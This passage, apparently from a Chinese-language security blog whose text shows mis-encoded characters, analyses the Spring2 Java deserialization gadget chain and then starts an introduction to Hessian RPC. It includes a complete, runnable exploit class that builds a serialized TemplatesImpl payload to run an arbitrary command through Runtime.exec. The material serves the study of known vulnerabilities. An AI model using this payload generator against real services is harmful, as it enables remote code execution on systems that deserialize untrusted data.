<h4 id="ä¿®å¤æƒ…å†µï¼ˆâ‰¤-JDK8u71ï¼‰-2"><a href="#ä¿®å¤æƒ…å†µï¼ˆâ‰¤-JDK8u71ï¼‰-2" class="headerlink" title="ä¿®å¤æƒ…å†µï¼ˆâ‰¤ JDK8u71ï¼‰"></a>ä¿®å¤æƒ…å†µï¼ˆâ‰¤ JDK8u71ï¼‰</h4><p>ä¸ CC0&#x2F;CC1 ä¸€æ ·</p>
<h3 id="Spring2"><a href="#Spring2" class="headerlink" title="Spring2"></a>Spring2</h3><div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-aop<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">at java.lang.ClassLoader.defineClass(ClassLoader.java:642)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader.defineClass(TemplatesImpl.java:142)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.defineTransletClasses(TemplatesImpl.java:346)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:383)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:418)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-1)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:483)</span><br><span class="line">at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:317)</span><br><span class="line">at org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:201)</span><br><span class="line">at com.sun.proxy.$Proxy0.newTransformer(Unknown Source:-1)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-1)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:483)</span><br><span class="line">at org.springframework.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:202)</span><br><span class="line">at org.springframework.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:187)</span><br><span class="line">at org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider.readObject(SerializableTypeWrapper.java:404)</span><br></pre></td></tr></table></figure></div>

<h4 id="åŸç†åˆ†æ-7"><a href="#åŸç†åˆ†æ-7" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h4><p>åœ¨ Spring1 é“¾åŸºç¡€ä¸Šæœ‰æ‰€å˜åŒ–ï¼ŒæŠŠ <code>spring-beans</code> çš„ <code>ObjectFactoryDelegatingInvocationHandler</code> æ¢æˆ <code>spring-aop</code> çš„ <code>org.springframework.aop.framework.JdkDynamicAopProxy</code>ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">JdkDynamicAopProxy</span> <span class="keyword">implements</span> <span class="title class_">AopProxy</span>, InvocationHandler, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> AdvisedSupport advised;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">JdkDynamicAopProxy</span><span class="params">(AdvisedSupport config)</span> <span class="keyword">throws</span> AopConfigException &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">        <span class="built_in">this</span>.advised = config;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>JdkDynamicAopProxy#invoke</code> å‡½æ•°ä¼šå°† <code>this.advised.targetSource</code> çš„ <code>getTarget</code> æ–¹æ³•è¿”å›çš„å¯¹è±¡ä¸ä¼ å…¥çš„æ–¹æ³• <code>method</code> ä»¥åŠå‚æ•° <code>args</code> ä¸€å¹¶ä¼ å…¥ <code>AopUtils#invokeJoinpointUsingReflection</code> æ–¹æ³•ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="type">TargetSource</span> <span class="variable">targetSource</span> <span class="operator">=</span> <span class="built_in">this</span>.advised.targetSource;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    target = targetSource.getTarget();</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    retVal = AopUtils.invokeJoinpointUsingReflection(target, method, args);</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>org.springframework.aop.support.AopUtils#invokeJoinpointUsingReflection</code> ä¼šå¯¹ä¼ å…¥çš„ <code>target</code> å¯¹è±¡è°ƒç”¨ä»£ç†çš„æ–¹æ³•ï¼Œå¹¶ä¸”å‚æ•°ä¹Ÿæ˜¯ <code>invoke</code> ä¼ å…¥çš„å‚æ•°ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">invokeJoinpointUsingReflection</span><span class="params">(Object target, Method method, Object[] args)</span></span><br><span class="line">        <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    ReflectionUtils.makeAccessible(method);</span><br><span class="line">    <span class="keyword">return</span> method.invoke(target, args);</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å› æ­¤æ€»ç»“ä¸€ä¸‹å°±æ˜¯ <code>JdkDynamicAopProxy#invoke</code> å‡½æ•°ä¼šå°†è°ƒç”¨è½¬å‘åˆ° <code>JdkDynamicAopProxy#advised.targetSource</code> çš„ <code>getTarget</code> æ–¹æ³•è¿”å›çš„å¯¹è±¡ä¸Šã€‚</p>
<p>è¿™é‡Œ <code>advised.targetSource</code> çš„ç±»å‹å®é™…ä¸Šæ˜¯ <code>org.springframework.aop.target.SingletonTargetSource</code>ï¼Œå®ƒçš„ <code>getTarget</code> æ–¹æ³•è¿”å›çš„æ˜¯ <code>target</code> å±æ€§ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getTarget</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.target;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>advised</code> çš„ç±»å‹æ˜¯ <code>org.springframework.aop.framework.AdvisedSupport</code>ï¼Œå®ƒçš„ <code>setTarget</code> æ–¹æ³•ä¼šå®ä¾‹åŒ–ä¸€ä¸ª <code>SingletonTargetSource</code> å¯¹è±¡è®¾ç½®åˆ° <code>targetSource</code> å±æ€§ä¸Šã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTarget</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">    setTargetSource(<span class="keyword">new</span> <span class="title class_">SingletonTargetSource</span>(target));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTargetSource</span><span class="params">(TargetSource targetSource)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.targetSource = (targetSource != <span class="literal">null</span> ? targetSource : EMPTY_TARGET_SOURCE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>SingletonTargetSource</code> çš„æ„é€ å‡½æ•°ä¼šå°†ä¼ å…¥çš„ <code>target</code> è®¾ç½®åˆ° <code>target</code> å±æ€§ä¸Šã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">SingletonTargetSource</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">    Assert.notNull(target, <span class="string">&quot;Target object must not be null&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.target = target;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å› æ­¤æˆ‘ä»¬å¯ä»¥ç®€åŒ–ä¸€ä¸‹ Spring1 çš„ååºåˆ—åŒ–é“¾ï¼š</p>
<ul>
<li>å°† <code>ObjectFactoryDelegatingInvocationHandler</code> æ›¿æ¢ä¸º <code>JdkDynamicAopProxy</code>ï¼›</li>
<li>å°† <code>JdkDynamicAopProxy</code> ä¸­çš„ <code>advised.targetSource</code> è®¾ç½®ä¸º <code>SingletonTargetSource</code>ï¼›</li>
<li><code>SingletonTargetSource#target</code> è®¾ç½®ä¸º <code>TemplatesImpl</code>ã€‚</li>
</ul>
<h4 id="åˆ©ç”¨ä»£ç -8"><a href="#åˆ©ç”¨ä»£ç -8" class="headerlink" title="åˆ©ç”¨ä»£ç "></a>åˆ©ç”¨ä»£ç </h4><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.framework.AdvisedSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Spring2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = getEvilClass(cmd);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">AdvisedSupport</span> <span class="variable">advisedSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">        advisedSupport.setTarget(templates);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ»¡è¶³ Type å’Œ Templates ç±»å‹è¦æ±‚ï¼Œä¸”åˆ©ç”¨ JDAP å°†æ–¹æ³•è°ƒç”¨è½¬å‘ç»™ advised.targetSource.target (TemplatesImpl)</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">JDAPClazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">JDAPConstruct</span> <span class="operator">=</span> JDAPClazz.getDeclaredConstructor(AdvisedSupport.class);</span><br><span class="line">        JDAPConstruct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">typeHandler</span> <span class="operator">=</span> (InvocationHandler) JDAPConstruct.newInstance(advisedSupport);</span><br><span class="line">        <span class="type">Type</span> <span class="variable">typeProxy</span> <span class="operator">=</span> (Type) Proxy.newProxyInstance(</span><br><span class="line">                ClassLoader.getSystemClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Type.class, Templates.class&#125;,</span><br><span class="line">                typeHandler</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// é’ˆå¯¹ getType æ–¹æ³•è°ƒç”¨è¿”å› typeProxy</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">getTypeMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        getTypeMap.put(<span class="string">&quot;getType&quot;</span>, typeProxy);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">typeProviderClazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">AIHClazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">AIHConstruct</span> <span class="operator">=</span> AIHClazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        AIHConstruct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">getTypeHandler</span> <span class="operator">=</span> (InvocationHandler) AIHConstruct.newInstance(Target.class, getTypeMap);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">getTypeProxy</span> <span class="operator">=</span> Proxy.newProxyInstance(</span><br><span class="line">                ClassLoader.getSystemClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;typeProviderClazz&#125;,</span><br><span class="line">                getTypeHandler</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">MITPClazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">MITPConstructor</span> <span class="operator">=</span> MITPClazz.getDeclaredConstructor(typeProviderClazz, Method.class, <span class="type">int</span>.class);</span><br><span class="line">        MITPConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">MITP</span> <span class="operator">=</span> MITPConstructor.newInstance(getTypeProxy, Object.class.getMethod(<span class="string">&quot;toString&quot;</span>), <span class="number">0</span>);</span><br><span class="line">        setFieldValue(MITP, <span class="string">&quot;methodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> MITP;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getPayload(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(getObject(cmd));</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = getPayload(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(payload);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] getEvilClass(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;EvilClass&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ctClass.getClassFile().setMajorVersion(<span class="number">49</span>);</span><br><span class="line">        ctClass.makeClassInitializer()</span><br><span class="line">                .setBody(<span class="string">&quot;&#123; java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;); &#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="Hessian"><a href="#Hessian" class="headerlink" title="Hessian"></a>Hessian</h1><p><strong>Hessian</strong> æ˜¯ä¸€ç§<strong>è½»é‡çº§çš„äºŒè¿›åˆ¶è¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼ˆRPCï¼‰æ¡†æ¶</strong>ï¼Œä¸»è¦ç”¨äº Java åº”ç”¨ä¹‹é—´çš„é«˜æ•ˆé€šä¿¡ã€‚å®ƒæä¾›äº†ä¸€ç§ç®€å•ã€é«˜æ•ˆçš„æ–¹å¼æ¥å®ç°åˆ†å¸ƒå¼åº”ç”¨ä¸­çš„æ•°æ®äº¤æ¢å’Œè¿œç¨‹è°ƒç”¨ã€‚</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.caucho<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hessian<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.63<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="å…³é”®å¯¹è±¡"><a href="#å…³é”®å¯¹è±¡" class="headerlink" title="å…³é”®å¯¹è±¡"></a>å…³é”®å¯¹è±¡</h2><h3 id="åºåˆ—åŒ–å·¥å‚"><a href="#åºåˆ—åŒ–å·¥å‚" class="headerlink" title="åºåˆ—åŒ–å·¥å‚"></a>åºåˆ—åŒ–å·¥å‚</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/10/21/Java%20%E5%B8%B8%E8%A7%81%E7%BB%84%E4%BB%B6/images/AbstractSerializerFactory.png"
                      alt="AbstractSerializerFactory"
                ></p>
<p><code>com.caucho.hessian.io.AbstractSerializerFactory</code>ï¼šæŠ½è±¡åºåˆ—åŒ–å™¨å·¥å‚ï¼Œæ˜¯ç®¡ç†å’Œç»´æŠ¤å¯¹åº”åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–æœºåˆ¶çš„å·¥å‚ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AbstractSerializerFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">abstract</span> <span class="keyword">public</span> Serializer <span class="title function_">getSerializer</span><span class="params">(Class cl)</span></span><br><span class="line">    <span class="keyword">throws</span> HessianProtocolException;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">abstract</span> <span class="keyword">public</span> Deserializer <span class="title function_">getDeserializer</span><span class="params">(Class cl)</span></span><br><span class="line">    <span class="keyword">throws</span> HessianProtocolException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>SerializerFactory</code>ï¼šæ ‡å‡†å®ç°</li>
<li><code>ExtSerializerFactory</code>ï¼šå¯ä»¥è®¾ç½®è‡ªå®šä¹‰çš„åºåˆ—åŒ–æœºåˆ¶</li>
<li><code>BeanSerializerFactory</code>ï¼šå¯¹ <code>Serializer</code> é»˜è®¤ <code>Object</code> çš„åºåˆ—åŒ–æœºåˆ¶è¿›è¡Œå¼ºåˆ¶æŒ‡å®šä¸º<code>BeanSerializer</code></li>
</ul>
<h3 id="IO-æµå¯¹è±¡"><a href="#IO-æµå¯¹è±¡" class="headerlink" title="IO æµå¯¹è±¡"></a>IO æµå¯¹è±¡</h3><p>åºåˆ—åŒ–å™¨å·¥å‚è‚¯å®šæ˜¯ä½œä¸º IO æµå¯¹è±¡çš„æˆå‘˜å»ä½¿ç”¨</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/10/21/Java%20%E5%B8%B8%E8%A7%81%E7%BB%84%E4%BB%B6/images/AbstractHessianInput.png"
                      alt="AbstractHessianInput"
                ></p>
<h3 id="ï¼ˆåï¼‰åºåˆ—åŒ–å™¨"><a href="#ï¼ˆåï¼‰åºåˆ—åŒ–å™¨" class="headerlink" title="ï¼ˆåï¼‰åºåˆ—åŒ–å™¨"></a>ï¼ˆåï¼‰åºåˆ—åŒ–å™¨</h3><p>Hessian çš„æœ‰å‡ ä¸ªé»˜è®¤å®ç°çš„åºåˆ—åŒ–å™¨ï¼Œå½“ç„¶ä¹Ÿæœ‰å¯¹åº”çš„ååºåˆ—åŒ–å™¨</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/10/21/Java%20%E5%B8%B8%E8%A7%81%E7%BB%84%E4%BB%B6/images/BeanSerializer.png"
                      alt="BeanSerializer"
                ></p>
<h2 id="åŸºæœ¬ä½¿ç”¨-2"><a href="#åŸºæœ¬ä½¿ç”¨-2" class="headerlink" title="åŸºæœ¬ä½¿ç”¨"></a>åŸºæœ¬ä½¿ç”¨</h2><h3 id="åºåˆ—åŒ–-ååºåˆ—åŒ–"><a href="#åºåˆ—åŒ–-ååºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–"></a>åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–</h3><p>å½“ä½ åªæƒ³è¦â€œç´§å‡‘çš„äºŒè¿›åˆ¶åºåˆ—åŒ–â€è€Œä¸éœ€è¦è¿œç¨‹è°ƒç”¨æ—¶ä½¿ç”¨ã€‚</p>
